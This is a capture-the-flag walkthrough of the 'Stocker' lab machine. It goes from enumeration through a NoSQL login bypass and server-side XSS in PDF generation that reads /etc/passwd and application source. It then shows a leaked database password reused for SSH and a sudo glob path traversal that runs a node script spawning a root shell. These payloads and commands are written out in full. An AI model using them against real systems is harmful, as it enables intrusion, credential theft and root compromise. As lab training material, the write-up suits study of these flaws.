![stocker.png](stocker.png)

# Stocker

## Enum
```bash
curl -i http://10.129.136.11
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 18 Jan 2023 08:38:10 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://stocker.htb

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

Adding stocker.htb to the hosts file and starting vhost enumeration -> no findings
```bash
cat scans/nmap.initial
# Nmap 7.93 scan initiated Sun Jan 15 22:13:24 2023 as: nmap -sC -sV -oN scans/nmap.initial 10.129.136.11
Nmap scan report for stocker.htb (10.129.136.11)
Host is up (0.064s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
|_http-title: Stock - Coming Soon!
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 15 22:13:34 2023 -- 1 IP address (1 host up) scanned in 9.76 seconds
```

```bash
dirsearch -r -u http://stocker.htb

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/stocker.htb/_23-01-15_22-30-30.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-23-01-15_22-30-30.log

Target: http://stocker.htb/

[22:30:30] Starting:
[22:30:31] 301 -  178B  - /js  ->  http://stocker.htb/js/     (Added to queue)
[22:30:49] 301 -  178B  - /css  ->  http://stocker.htb/css/     (Added to queue)
[22:30:51] 200 -    1KB - /favicon.ico
[22:30:52] 301 -  178B  - /fonts  ->  http://stocker.htb/fonts/     (Added to queue)
[22:30:53] 301 -  178B  - /img  ->  http://stocker.htb/img/     (Added to queue)
[22:30:53] 200 -   15KB - /index.html
[22:30:54] 403 -  564B  - /js/
[22:31:07] Starting: js/
[22:31:44] Starting: css/
[22:32:20] Starting: fonts/
[22:32:55] Starting: img/

Task Completed
```

```bash
whatweb http://stocker.htb
http://stocker.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.136.11], Meta-Author[Holger Koenemann], MetaGenerator[Eleventy v2.0.0], Script, Title[Stock - Coming Soon!], nginx[1.18.0]
```



![wappalizer.png](wappalizer.png)  

Manual enumaration of the site:
```
AOS            - Animate on scroll library
Bootstrap 5    - CSS Framework
Eleventy 2.0.0 - Static site generator
Nginx 1.18.0   - Webserver
```

Potential users
```
Angoose Garden, Head of IT at Stockers Ltd.
Meta-Author[Holger Koenemann]
```

Found the source of the template from templatedeck.com  
[Stride-HTML-Bootstrap-Template](https://github.com/holger1411/Stride-HTML-Bootstrap-Template)  
Holger is the author of the template, nothing to do with the app


So at this stage we pretty much have only a static site, and nothing interesting, so I tried to nmap all ports, and enumerating vhosts with bigger wordlists, wasted a bunch of time to finally realise by funneling gobuster's traffic through burp that there's a new option for vhosts now `--append-domain`, which is why gobuster was actually sending just the word from the wordlist without appending the rest of the domain... That's kinda dumb, is that new? WTH... Looking at my notes for the awkward box, yes it used to append the domain by default on v3.1.0, and the version I'm using now is v3.4, talk about wasting my time... So this is the correct way now: 
```bash
gobuster vhost --append-domain -u stocker.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.4
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/01/28 12:08:26 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
Progress: 577 / 4990 (11.56%)
```

Or the way I'll probably do this from now on:
```
ffuf \
  -c \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u "http://stocker.htb" \
  -H "Host: FUZZ.stocker.htb" \
  -fc 301

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration    : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 35ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1124 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

After adding that to our host file we can navigate to that vhost, and this is a login page.  
We know the backend for that is node, because we can see from te http headers that this is hosted on an Express server.  
So as pointed out by ippsec in his video about shoppy, just because it uses node, we can probably deduce that the db is mongo, or at least something nosql.
![node.png](node.png)  

## NoSQL login bypass
Following the [hacktricks page](https://book.hacktricks.xyz/pentesting-web/nosql-injection) on nosqli, and pretty much doing the exact same thing as ippsec showcased in his video, we can change the payload type to application/json and send invalid json on purpose. This returns a nodejs stack trace, which also leaks some path:
```html
<pre>
SyntaxError: Unexpected token a in JSON at position 45<br>
 &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br>
 &nbsp; &nbsp;at parse (/var/www/dev/node_modules/body-parser/lib/types/json.js:89:19)<br>
 &nbsp; &nbsp;at /var/www/dev/node_modules/body-parser/lib/read.js:128:18<br>
 &nbsp; &nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:203:9)<br>
 &nbsp; &nbsp;at invokeCallback (/var/www/dev/node_modules/raw-body/index.js:231:16)<br>
 &nbsp; &nbsp;at done (/var/www/dev/node_modules/raw-body/index.js:220:7)<br>
 &nbsp; &nbsp;at IncomingMessage.onEnd (/var/www/dev/node_modules/raw-body/index.js:280:7)<br>
 &nbsp; &nbsp;at IncomingMessage.emit (node:events:513:28)<br>
 &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1359:12)<br>
 &nbsp; &nbsp;at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
</pre>
```

We're now attempting to do the not equal trick in json format.  
The string one doesn't work and redirects to the login page again, but the null one:    
```
POST /login HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 55
Origin: http://dev.stocker.htb
Connection: close
Referer: http://dev.stocker.htb/login
Cookie: connect.sid=s%3ABQLPJCRVtbFfVXj-9O0BH2XcR4MhONsU.%2B7h0w9%2BrKhzpCdLJyODPSNcOoSKzxeMYPKNvmSZNOu0
Upgrade-Insecure-Requests: 1

{"username": {"$ne": null}, "password": {"$ne": null} }
```

responds back whit a 302 as well but to the /stock page  
with a Set-Cookie header to a new express session id
```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 28 Jan 2023 14:24:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
X-Powered-By: Express
Location: /stock
Vary: Accept
Set-Cookie: connect.sid=s%3AeuJjM4ivC0KICQA8NBmP0ofJkyzc4tof.StbQgcHx26HhA51CyGSgaHVlebcRQQ4Cz%2FKzVX%2FkPdc; Path=/; HttpOnly

<p>Found. Redirecting to <a href="/stock">/stock</a></p>
```

Installing that cookie into our browser, we can now navigate to /stock


## Enum again 

This is a simple webstore  with products that each have a add to cart button, and there's a view cart, none of those buttons are doing http calls, so this is happening client side, but the products are added to cart, then the submit button does a POST
```
POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://dev.stocker.htb/stock
Content-Type: application/json
Origin: http://dev.stocker.htb
Content-Length: 163
Connection: close
Cookie: connect.sid=s%3AbbZi88s3VyXnFcdZLyVHmar9ts36h2pt.OxJN91F%2B10qTaxqXNkAy%2Bg%2FiRnW%2FI4FSW6qjEzzmdrE

{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8f",
      "title": "Bin",
      "description": "It's a rubbish bin.",
      "image": "bin.jpg",
      "price": 76,
      "currentStock": 15,
      "__v": 0,
      "amount": 1
    }
  ]
}
```

This is what the client side js looks like:
```js
const $ = (selector) => document.querySelector(selec

const basket = [];

let productStore = [];

const cartModalElement = $("#cart-modal");
const cartModal = new bootstrap.Modal(cartModalElement);

fetch("/api/products")
.then((response) => response.json())
.then((products) => {
productStore = products;
const template = $("#product-template");

products.forEach((product) => {
  const clone = template.content.cloneNode(true);
  const $$ = (selector) => clone.querySelector(selector);

  $$(".item-title").textContent = product.title;
  $$(".item-description").textContent = product.description;
  $$(".item-price").textContent = `£${product.price.toFixed(2)}`;
  $$(".item-stock").textContent = `${product.currentStock} In Stock`;
  $$(".item-image").setAttribute("src", `/static/img/${product.image}`);
  $$(".add-to-basket").setAttribute("product-id", product._id);

  $("#item-container").appendChild(clone);
});

Array.from(document.querySelectorAll(".add-to-basket")).forEach((button) => {
  button.addEventListener("click", () => {
    const product = productStore.find((product) => product._id === button.getAttribute("product-id"));

    if (!product) return;

    const existing = basket.find((basketItem) => basketItem._id === product._id);
    if (existing) {
      existing.amount++;
    } else {
      basket.push({ ...product, amount: 1 });
    }

    alert("Added to basket!");
    console.log(basket);
  });
});
});

const beforePurchase = $("#before-purchase");
const afterPurchase = $("#after-purchase");
const cartTable = $("#cart-table");
const submitPurchase = $("#submit-purchase");

const purchaseOrderLink = $("#purchase-order-link");

cartModalElement.addEventListener("show.bs.modal", () => {
beforePurchase.style.display = "";
afterPurchase.style.display = "none";

document.querySelectorAll(".basket-item").forEach((item) => item.remove());

const template = $("#basket-template");

basket.forEach((basketItem) => {
const clone = template.content.cloneNode(true);

const $$ = (selector) => clone.querySelector(selector);

$$(".item-name").textContent = basketItem.title;

$$(".item-quantity").textContent = basketItem.amount;
$$(".item-price").textContent = `£${basketItem.price.toFixed(2)}`;

cartTable.prepend(clone);
});

$("#cart-total").textContent = basket
.map((x) => x.price * x.amount)
.reduce((a, b) => a + b, 0)
.toFixed(2);

if (basket.length > 0) {
submitPurchase.style.display = "";
} else {
submitPurchase.style.display = "none";
}
});

submitPurchase.addEventListener("click", () => {
fetch("/api/order", {
method: "POST",
body: JSON.stringify({ basket }),
headers: {
  "Content-Type": "application/json",
},
})
.then((response) => response.json())
.then((response) => {
  if (!response.success) return alert("Something went wrong processing your order!");

  purchaseOrderLink.setAttribute("href", `/api/po/${response.orderId}`);

  $("#order-id").textContent = response.orderId;

  beforePurchase.style.display = "none";
  afterPurchase.style.display = "";
  submitPurchase.style.display = "none";
});
});
```
    
when sending the cart to /api/order we get the following data back:
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 28 Jan 2023 14:44:41 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 53
Connection: close
X-Powered-By: Express
ETag: W/"35-ez94hP3JKzcX6Wxf3ttYsRvF5Cg"

{
  "success": true,
  "orderId": "63d534d98816952dec5f2c60"
}
```

And the client side app diplays that for us:
![thanks.png](thanks.png)  

The `here` hyperlink is Getting `http://dev.stocker.htb/api/po/63d534d98816952dec5f2c60`, which is a pdf with the order details of the order we just sent:
```bash
exiftool stocker.pdf
ExifTool Version Number         : 12.54
File Name                       : stocker.pdf
Directory                       : .
File Size                       : 38 kB
File Modification Date/Time     : 2023:01:28 14:28:39+00:00
File Access Date/Time           : 2023:01:28 14:28:39+00:00
File Inode Change Date/Time     : 2023:01:28 14:29:46+00:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Tagged PDF                      : Yes
Creator                         : Chromium
Producer                        : Skia/PDF m108
Create Date                     : 2023:01:28 14:50:08+00:00
Modify Date                     : 2023:01:28 14:50:08+00:00
```

Looking to see if that library is vulnerable, there are issues with other components of skia, but it doesn't look like the pdf generation is vulnerable.  
  
The pdf itself mentions the email `support@stock.htb` we can try to see if this is beeing opened by some support bot, in which case we be able to leverage this for XSS.


## Server Side XSS

```html
<img src='http://10.10.14.53:8000/baniania'>
```
We get a callback, from the server's IP, and this is happening without any delay, looks like at the same time as the pdf is beeing generated, this looks like there is Server Side XSS in the pdf generation.

Following hacktricks page on [Server Side XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) until something sticks:  
```html
<iframe src=file:///etc/passwd width="560" height="315"></iframe>
```

## XSS to SSRF / arbitrary file read
The iframe worked, and this gives us an arbitrary file read / SSRF.  
![iframe.png](iframe.png)    

We just need to make the iframe slightly bigger to be able to see the whole content of the file:
```html
<iframe src=file:///etc/passwd width=\"560\" height=\"700\"></iframe>
```
![big-iframe.png](big-iframe.png)    

```bash
grep sh$ passwd
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:112:119:fwupd-refresh
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
```

Remember that guy from the main page?   
Angoose Garden, Head of IT at Stockers Ltd.  
does he have a private key? 
```html
<iframe src=file:///home/angoose/.ssh/id_rsa width=\"560\" height=\"700\"></iframe>
```
no


## Credential reuse
We already know that the app is using mongo, so maybe we can try to leak the db password in case it was reused? Looking at this blog post from [mongodb.com](https://www.mongodb.com/blog/post/quick-start-nodejs-mongodb-how-to-get-connected-to-your-database) it looks like they're just setting a const uri with a connection string that has the creds, directly in the code, lets see if we can get our hands on that. 
```html
<iframe src=file:///var/www/dev/node_modules/raw-body/index.js width=\"560\" height=\"700\"></iframe>
<iframe src=file:///etc/mongod.conf width=\"560\" height=\"700\"></iframe>
<iframe src=file:///var/www/dev/index.js width=\"560\" height=\"700\"></iframe>
```

It was simply in the index.js file
```javascript
const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI =
"mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?
authSource=admin&w=1";
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
session({
secret: randomBytes(32).toString("hex"),
resave: false,
saveUninitialized: true,
store: MongoStore.create({
mongoUrl: dbURI,
}),
})
);
```

```bash
cat user.txt |wc -c
33
```


## Privesc enum

```bash
angoose@stocker:/opt/google/chrome$ sudo -l
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js

```


## Code execution as root due to globing in the sudo line

So because of the globing we can do some directory traversal with that, we just have to drop a node.js script that will drop a shell and preserve root privileges:
```bash
angoose@stocker:/usr/local/scripts$ cat /dev/shm/test.js
require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})
```

And we can call that with some simple path traversal
```bash
angoose@stocker:/usr/local/scripts$ sudo /usr/bin/node /usr/local/scripts/../../../dev/shm/test.js
# id
uid=0(root) gid=0(root) groups=0(root)
# wc ~/root.txt -c
33 /root/root.txt
```
